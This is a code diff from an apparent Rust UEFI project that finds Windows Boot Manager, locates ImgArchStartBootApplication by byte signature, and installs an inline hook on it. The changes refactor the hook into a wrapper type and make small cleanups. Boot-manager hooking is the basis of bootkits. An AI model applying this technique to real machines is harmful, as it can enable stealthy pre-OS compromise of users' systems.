@@ -5,15 +5,14 @@ extern crate alloc;
 
 mod hook;
 
-use core::ffi::c_void;
-use core::u8;
-
 use alloc::borrow::ToOwned;
 use alloc::boxed::Box;
 use alloc::slice;
 use alloc::vec::Vec;
+use core::ffi::c_void;
+use core::u8;
 
-use hook::{trampoline_hook, ImgArchStartBootApplication};
+use hook::{Hook, ImgArchStartBootApplication};
 use uefi::prelude::*;
 use uefi::proto::device_path::{
     build::{media::FilePath, DevicePathBuilder},
@@ -28,8 +27,7 @@ use uefi::{CStr16, Identify};
 const WINDOWS_BOOTMGR_PATH: &CStr16 = cstr16!("\\efi\\microsoft\\boot\\bootmgfw.efi");
 const IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE: &str = "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9";
 
-static mut IMG_ARCH_START_BOOT_APPLICATION: Option<ImgArchStartBootApplication> = None;
-static mut IMG_ARCH_START_BOOT_ORIGINAL: [u8; hook::JMP_SIZE] = [0; hook::JMP_SIZE];
+static mut IMG_ARCH_START_BOOT_APPLICATION: Option<Hook<ImgArchStartBootApplication>> = None;
 
 #[entry]
 fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
@@ -50,7 +48,7 @@ fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status
         .unwrap();
     setup_hooks(&bootmgr_handle, boot_services);
     log::info!("[+] Starting Windows Boot Manager");
-    system_table.boot_services().stall(5_000_000);
+    system_table.boot_services().stall(2_000_000);
     boot_services
         .start_image(bootmgr_handle)
         .expect("Failed to start Windows Boot Manager");
@@ -66,14 +64,10 @@ fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
     let offset = find_pattern(IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE, bootmgr_data)
         .expect("Unable to match ImgArchStartBootApplication signature");
     unsafe {
-        IMG_ARCH_START_BOOT_APPLICATION =
-            Some(core::mem::transmute::<_, ImgArchStartBootApplication>(
-                image_base.offset(offset as isize) as *mut c_void,
-            ));
-        IMG_ARCH_START_BOOT_ORIGINAL = trampoline_hook(
-            IMG_ARCH_START_BOOT_APPLICATION.unwrap() as *mut _,
-            img_arch_start_boot_application_hook as *const ImgArchStartBootApplication,
-        )
+        IMG_ARCH_START_BOOT_APPLICATION = Some(Hook::new(
+            image_base.add(offset) as *mut _,
+            img_arch_start_boot_application_hook as *const _,
+        ));
     };
 }
 
@@ -132,7 +126,6 @@ fn pattern_to_hex(pattern: &str) -> Vec<Option<u8>> {
     let mut result = Vec::new();
     pattern
         .split_ascii_whitespace()
-        .into_iter()
         .for_each(|char| match char {
             "?" => result.push(None),
             other => result.push(Some(
